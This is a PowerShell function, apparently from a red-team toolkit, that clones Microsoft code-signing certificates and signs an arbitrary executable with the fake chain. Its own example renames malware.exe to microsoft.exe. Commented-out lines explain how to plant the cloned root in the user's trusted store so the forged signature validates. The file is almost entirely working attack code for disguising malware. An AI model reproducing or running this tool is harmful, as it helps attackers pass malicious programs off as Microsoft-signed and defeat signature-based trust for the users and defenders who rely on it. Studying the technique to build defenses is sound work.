Function Sign-Artifact {
    <#
    .SYNOPSIS
        Signs input executable file with a faked Microsoft code signing certificate.

    .DESCRIPTION
        This script uses built-into Windows interfaces to import a fake Microsoft code-signing certificate
        and use it to sign input executable artifact. Result will be signed, although not verifiable executable.

        Based on Matt Graeber's implementation:
            https://posts.specterops.io/code-signing-certificate-cloning-attacks-and-defenses-6f98657fc6ec

    .EXAMPLE
        PS C:\> Sign-Artifact -InputFile malware.exe -OutputFile microsoft.exe
    #>

    [CmdletBinding()]
    param(
        [Parameter(Mandatory=$True)]
        [string]
        $InputFile,

        [Parameter(Mandatory=$True)]
        [string]
        $OutputFile,

        [switch]
        $Quiet
    )

    $Verbose = $PSCmdlet.MyInvocation.BoundParameters["Verbose"].IsPresent

    if (-not(Test-Path $InputFile))
    {
        Write-Error "[!] Input file does not exist! FilePath: $InputFile"
        exit 1
    }

    if(Test-Path $OutputFile)
    {
        Remove-Item -Force $OutputFile
    }

    #
    # Based on:
    #    
    #

    # We'll just store the cloned certificates in current user "Personal" store for now.
    $CertStoreLocation = @{ CertStoreLocation = 'Cert:\CurrentUser\My' }

    $MS_Root_Cert = Get-PfxCertificate -FilePath (Join-Path -Path $PSScriptRoot -ChildPath "\MSKernel32Root.cer")
    $Cloned_MS_Root_Cert = New-SelfSignedCertificate -CloneCert $MS_Root_Cert @CertStoreLocation

    $MS_PCA_Cert = Get-PfxCertificate -FilePath (Join-Path -Path $PSScriptRoot -ChildPath "MSKernel32PCA.cer")
    $Cloned_MS_PCA_Cert = New-SelfSignedCertificate -CloneCert $MS_PCA_Cert -Signer $Cloned_MS_Root_Cert @CertStoreLocation

    $MS_Leaf_Cert = Get-PfxCertificate -FilePath (Join-Path -Path $PSScriptRoot -ChildPath "MSKernel32Leaf.cer")
    $Cloned_MS_Leaf_Cert = New-SelfSignedCertificate -CloneCert $MS_Leaf_Cert -Signer $Cloned_MS_PCA_Cert @CertStoreLocation


    # Validate that that $OutputFile is not signed.
    if($Verbose) 
    {
        Write-Host "`n================================================================================================`n[.] Before signing: `n"
        Get-AuthenticodeSignature -FilePath $InputFile
    }

    Copy-Item -Force $InputFile $OutputFile | Out-Null


    # Sign $OutputFile with the cloned Microsoft leaf certificate.
    Set-AuthenticodeSignature -Certificate $Cloned_MS_Leaf_Cert -FilePath $OutputFile | Out-Null

    # The certificate will not properly validate because the root certificate is not trusted.

    # View the StatusMessage property to see the reason why Set-AuthenticodeSignature returned "UnknownError"
    # "A certificate chain processed, but terminated in a root certificate which is not trusted by the trust provider"

    if($Verbose) 
    {
        Write-Host "`n================================================================================================`n[+] After signing: `n"
        Get-AuthenticodeSignature -FilePath $OutputFile
    }
       
    if(-not $Quiet -or $Verbose)
    {
        Get-AuthenticodeSignature -FilePath $OutputFile | Format-List *
    }

    # Save the root certificate to disk and import it into the current user root store.
    # Upon doing this, the $OutputFile signature will validate properly.
    # Export-Certificate -Type CERT -FilePath (Join-Path -Path $PSScriptRoot -ChildPath "MSKernel32Root_Cloned.cer") -Cert $Cloned_MS_Root_Cert
    # Import-Certificate -FilePath (Join-Path -Path $PSScriptRoot -ChildPath "MSKernel32Root_Cloned.cer") -CertStoreLocation Cert:\CurrentUser\Root\
    # 
    # # You may need to start a new PowerShell process for the valid signature to take effect.
    # Get-AuthenticodeSignature -FilePath $FilePath
}